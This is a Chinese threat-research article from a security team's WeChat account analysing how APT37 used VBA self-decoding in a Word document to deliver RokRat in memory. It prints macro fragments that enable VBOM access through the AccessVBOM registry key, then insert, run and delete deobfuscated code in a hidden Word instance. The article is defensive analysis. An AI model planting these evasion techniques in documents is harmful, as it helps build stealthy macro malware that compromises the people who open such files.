##  攻击技术研判｜APT37组织利用VBA自解码技术的攻击手法赏析

原创 天元实验室  [ M01N Team ](javascript:void\(0\);)

**M01N Team** ![]()

微信号 m01nteam

功能介绍 攻击对抗研究分享

____

__

收录于话题

#攻击技术研判

10个

![](https://gitee.com/fuli009/images/raw/master/public/20210816183855.png)

**情报背景**

2020年12月Malwarebytes的研究者发现针对韩国政府的使用RokRat远控工具的APT文档攻击。钓鱼文档中显示的日期为2020年1月，这显示该攻击的真实发生时间约在一年之前。这次的攻击行为中使用了将文档中嵌入的混淆VBA代码自解码到Word的内存代码并加载执行，最终向新创建的进程注入恶意代码，启动RokRat远控恶意软件。在攻击过程中未向磁盘写入含有恶意代码的文件，均在内存中完成。  
根据内存中存在的恶意载荷，研究人员认为该文档攻击样本与可能来自朝鲜的APT37攻击组织关联。该团伙通常以韩国常用的Hangul
Office办公软件的hwp文件格式进行攻击，本次事件中VBA自解码技术是该第一次被该团队所使用。本文将对这种基于VBOM的VBA自解码技术进行剖析，分析其优势与局限性。

  

 **组织名称**

|

APT37  
  
  
---|---  
  
 **关联组织**

|

ScarCruft, Reaper, Group123, TEMP.Reaper  
  
 **战术标签**

|

初始访问 执行 防御规避  
  
 **技术标签**

|

OfficeVBA宏攻击，VBA自解码  
  
 **情报来源**

|

https://blog.malwarebytes.com/threat-analysis/2021/01/retrohunting-
apt37-north-korean-apt-used-vba-self-decode-technique-to-inject-rokrat/  
  
  

 **01** 攻击技术分析

 **亮点：VBOM VBA自解码技术**

VBA自解码动态执行技术是在Office文档的宏中进行宏代码的动态解析与创建，最终实现具有隐蔽性的VBA代码执行的技术。

  

在该攻击时间中，攻击者使用VBA自解码技术在文档中嵌入了混淆后的用于注入恶意shellcode的宏代码。

![](https://gitee.com/fuli009/images/raw/master/public/20210816183906.png)

  

1 VBOM-VBA自解码技术的前提条件

VBOM（VB object
model，VB对象模型）为Office软件中可用于操作Office应用文档中的宏的抽象模型。通过对VBOM的操作，可以对文档中的宏进行操作，例如增删宏模组与代码，执行宏代码。

![](https://gitee.com/fuli009/images/raw/master/public/20210816183907.png)

  

因为安全性上的考虑
VBOM默认被禁用，但是可以通过修改普通用户具有修改权限的注册表键值进行开启，相关注册表键为"HKEY_CURRENT_USER\Software
\Microsoft\office"+ Application Version +"\Word\
Security\AccessVBOM"为1时启用VBOM，为0时禁用VBOM。

  

2 步步为营，利用VBA自解码机制实现不落地攻击

a. 检测VBOM是否开启，未开启则主动开启

通过尝试创建VBOM对象检测VBOM是否被禁用

  

    
    
    1Private Function ljojijbjs() As Boolean  
    2On Error GoTo Erreur  
    3Dim codeModule As Object  
    4Set codeModule = ThisDocument.VBProject.VBComponents  
    5ljojijbjs = True  
    6Exit Function  
    7Erreur:  
    8ljojijbjs = False  
    9End Function  
    

  

  

若VBOM被禁用则修改注册表开启VBOM

    
    
    1Private Sub fngjksnhokdnfd(newValue As Integer)  
    2Dim wsh As Object  
    3Dim regKey As String  
    4Set wsh = CreateObject("WScript.shell")  
    5regKey = "HKEY_CURRENT_USER\Software\Microsoft\Office\" & Application.Version & "\Word\Security\AccessVBOM" '修改注册表启用VBOM  
    6  
    7wsh.RegWrite regKey, newValue, "REG_DWORD"  
    8End Sub  
    

  

b. 写入自身只读副本，动态执行宏代码

创建"Word.Application"对象，并以只读方式打开自身，接下来使用内置代码把混淆后的代码还原回VBA宏代码的形式。

    
    
    1Dim FileName As String  
    2Dim objWord As Word.Application  
    3Set objWord = CreateObject("Word.Application")  
    4FileName = ThisDocument.FullName  
    5objWord.Visible = False  
    6objWord.Documents.Open FileName, ReadOnly:=True  
    

  

创建新的宏模块，并使用InsertLines方法插入解混淆后的宏代码，使用"Application.Run"方法执行VBA宏代码，在执行完成后再移除刚刚添加的宏模块。

    
    
     1Private Sub eviwbejfkaksd(encodedStr As String)  
     2Dim strDecode As String  
     3Dim strNameModule As String  
     4strDecode = gkrnpslmyie(encodedStr) '解混淆函数  
     5Dim nbrLigne As Long  
     6nbrLigne = 2  
     7strNameModule = ThisDocument.VBProject.VBComponents.Add(1).Name  
     8With ActiveDocument.VBProject.VBComponents(strNameModule).codeModule  
     9.InsertLines nbrLigne, strDecode '创建新模组并将解混淆之后的代码插入  
    10End With  
    11Dim strMacro As String  
    12strMacro = strNameModule & ".main"  
    13Application.Run (strMacro)  
    14Application.VBE.ActiveVBProject.VBComponents.Remove VBComponent:=ActiveDocument.VBProject.VBComponents(strNameModule)  
    15End Sub  
    

  

因为是以只读方式打开的文件，并且动态执行，模块添加与移除的过程中在文件系统上并没有创建文件，恶意代码仅仅存于内存中。

  

  

 **02  **总结

VBA代码的自解码与动态执行大大增加了代码混淆与隐蔽的灵活性，配合不同的混淆方式可实现核心代码的高度隐藏，对于特征检测与静态分析有一定隐匿效果。但面对完善的动态分析与行为检测则无所遁形，需要配合其他攻击手法达到更强的防御规避效果。VBA自解码所依赖的VBOM默认被禁止，修改注册表操作本身又易被安全软件告警，使用场景本身有局限性。

  

  

![](https://gitee.com/fuli009/images/raw/master/public/20210816183908.png)

 **绿盟科技M01N战队** 专注于Red
Team、APT等高级攻击技术、战术及威胁研究，涉及Web安全、终端安全、AD安全、云安全等相关领域。通过研判现网攻击技术发展方向，以攻促防，为风险识别及威胁对抗提供决策支撑，全面提升安全防护能力。

  

![](https://gitee.com/fuli009/images/raw/master/public/20210816183910.png)

 **M01N Team**

聚焦高级攻防对抗热点技术

绿盟科技蓝军技术研究战队

  

预览时标签不可点

收录于话题 #

个 __

上一篇 下一篇

阅读

分享 收藏

赞 在看

____已同步到看一看[写下你的想法](javascript:;)

前往“发现”-“看一看”浏览“朋友在看”

![](//res.wx.qq.com/mmbizwap/zh_CN/htmledition/images/pic/appmsg/pic_like_comment55871f.png)

前往看一看

**看一看入口已关闭**

在“设置”-“通用”-“发现页管理”打开“看一看”入口

[我知道了](javascript:;)

__

已发送

取消 __

####  发送到看一看

发送

攻击技术研判｜APT37组织利用VBA自解码技术的攻击手法赏析

最多200字，当前共字

__

发送中

写下你的留言

微信扫一扫  
关注该公众号

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

[知道了](javascript:;)

**长按识别前往小程序**

![]()

